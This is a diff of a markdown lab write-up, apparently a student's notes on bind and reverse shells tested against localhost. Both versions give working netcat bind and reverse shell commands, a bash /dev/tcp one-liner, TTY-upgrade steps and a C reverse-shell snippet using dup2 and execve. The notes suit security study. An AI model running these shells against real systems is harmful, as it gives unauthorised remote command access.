@@ -8,98 +8,120 @@ Getting a shell on a target is the goal of most attacks. Once you have a shell, 
 ## Bind Shell vs Reverse Shell
 
 **Bind shell** — the victim listens, you connect to it.
-```
-Victim:   nc -nvlp 4444 -e /bin/bash
-Attacker: nc <victim_ip> 4444
-```
-Rarely used in real engagements. If the victim is behind a firewall or NAT, inbound connections get blocked. Also requires you to know the victim's IP and it can't change.
+- Victim runs a listener and waits
+- You connect to it using the victim's IP and port
+- Rarely works in real engagements — firewalls block inbound connections
 
 **Reverse shell** — you listen, the victim connects back to you.
-```
-Attacker: nc -nvlp 4444
-Victim:   bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
-```
-This is the one that actually works in practice. Outbound connections are almost never blocked. The victim reaches out to you.
+- You set up the listener on your machine
+- Victim reaches out to you
+- Works because outbound connections are almost never blocked
 
 ---
 
-## What I did
-
-### Bind shell with netcat
-Ran `nc -nvlp 4444 -e /bin/bash` on the victim side (one terminal), connected with `nc 127.0.0.1 4444` from attacker side. Ran `id` — got full user and group info back. Shell working.
-
-### Reverse shell with netcat
-Listener: `nc -nvlp 4444`
-Victim: `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`
-
-**Key lesson:** `/dev/tcp` is a bash feature. My default shell is **zsh**, and zsh doesn't support it. Running the command directly in zsh gives `no such file or directory`. Fix: explicitly call bash with `bash -c '...'`.
-
-### TTY upgrade
-A raw netcat shell is dumb — no tab completion, no arrow keys, Ctrl+C kills the whole thing, `sudo` won't work. Upgrading to a full TTY fixes all of that.
+## Bind Shell with Netcat
 
 ```bash
-# On the victim shell (inside nc):
+# Victim
+nc -nvlp 4444 -e /bin/bash
+
+# Attacker
+nc 127.0.0.1 4444
+```
+
+<!-- SCREENSHOT 2: victim terminal showing nc -nvlp 4444 -e /bin/bash listening and receiving connection -->
+
+<!-- SCREENSHOT 1: attacker terminal showing id command output with full uid/groups -->
+
+---
+
+## Reverse Shell with Netcat
+
+```bash
+# Attacker (listens first)
+nc -nvlp 4444
+
+# Victim (calls back)
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+```
+
+**Important — zsh doesn't support /dev/tcp.** My default shell is zsh and running the command directly in zsh fails with `no such file or directory`. Always invoke bash explicitly with `bash -c '...'`.
+
+<!-- SCREENSHOT 3: zsh error — no such file or directory: /dev/tcp/127.0.0.1/4444 -->
+
+Once you call bash explicitly it works:
+
+<!-- SCREENSHOT 4: both terminals — listener got connection, victim ran bash -c command -->
+
+Running commands through the reverse shell:
+
+<!-- SCREENSHOT 5: id and whoami responses coming back through the shell -->
+
+---
+
+## TTY Upgrade
+
+A raw netcat shell is dumb — no tab completion, no arrow keys, Ctrl+C kills the whole session, sudo won't work. Upgrading to a full TTY fixes all of that.
+
+```bash
+# Step 1 — run inside the reverse shell (the nc listener terminal)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# Ctrl+Z to background
+# Step 2 — Ctrl+Z to background the shell
 
-# On local terminal:
+# Step 3 — run on your LOCAL terminal
 stty raw -echo; fg
 
-# Press Enter twice, then:
+# Step 4 — press Enter twice, then run inside the shell
 export TERM=xterm
 ```
 
-Now you have a full interactive shell. Prompt changes, tab completion works, Ctrl+C sends SIGINT instead of killing the session.
+**Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed — inside the nc listener terminal.
 
-**Mistake I made first time:** ran the python3 command in my local terminal instead of inside the reverse shell. `hostnamepython3: command not found` was the error. Always make sure you're typing inside the shell that landed on your listener.
+<!-- SCREENSHOT 6: hostnamepython3 command not found error -->
 
-### C reverse shell (shell.c)
-Compiled and ran the `shell.c` from the repo:
+---
+
+## C Reverse Shell
+
+Compiled and ran `shell.c` from the repo — a raw C reverse shell that creates a socket, connects back, and hands over `/bin/sh`.
 
 ```bash
 gcc -o shell shell.c
 ./shell 127.0.0.1 4444
 ```
 
-Listener caught the connection, ran `id`, got user info back. No netcat on the victim side — the binary handles the socket connection itself.
+<!-- SCREENSHOT 7: Terminal 2 showing gcc compile and ./shell 127.0.0.1 4444 running -->
 
----
+<!-- SCREENSHOT 8: Terminal 1 showing connection received and id output -->
 
-## How shell.c works
+How it works under the hood:
 
 ```c
-int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+int sockfd = socket(AF_INET, SOCK_STREAM, 0);   // create TCP socket
+connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));  // connect to attacker
 
 for (int i = 0; i < 3; i++) {
-    dup2(sockfd, i);   // redirect stdin(0), stdout(1), stderr(2) to socket
+    dup2(sockfd, i);  // redirect stdin(0), stdout(1), stderr(2) to socket
 }
 
-execve("/bin/sh", NULL, NULL);  // spawn shell — now all I/O flows over the socket
+execve("/bin/sh", NULL, NULL);  // replace process with a shell
 ```
 
-Three things happen:
-1. A TCP socket is created and connected to the attacker's listener
-2. `dup2` redirects all three standard file descriptors to the socket — so everything you type goes to the process and everything it outputs comes back to you
-3. `execve` replaces the process with `/bin/sh` — attacker now has a shell
-
-This is the same pattern used in shellcode and real malware, just written cleanly in C.
+`dup2` is the key — it rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` and the attacker has a shell.
 
 ---
 
-## Key things to remember
+## Key Takeaways
 
-- Always use reverse shells over bind shells in real scenarios
-- `/dev/tcp` only works in bash — not zsh, not sh, not dash
-- A raw shell from nc is not fully interactive — always upgrade with python3 pty or socat
-- The TTY upgrade commands run **inside the reverse shell**, not in your local terminal
-- `dup2(fd, 0/1/2)` is the core trick in any socket-based shell — redirects I/O to the network connection
-- `execve` doesn't return if successful — it replaces the current process entirely
+- Reverse shells over bind shells — always
+- `/dev/tcp` is bash-only — zsh, sh, and dash don't support it
+- Raw nc shells are not interactive — always upgrade with python3 pty
+- TTY upgrade commands go inside the reverse shell, not your local terminal
+- `dup2` + `execve` is the core pattern behind every socket-based shell
 
 ---
 
 ## Resources
 - [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [revshells.com](https://revshells.com) — quick reverse shell one-liner generator
-- socat for more stable shells than netcat
+- [revshells.com](https://revshells.com) — reverse shell one-liner generator
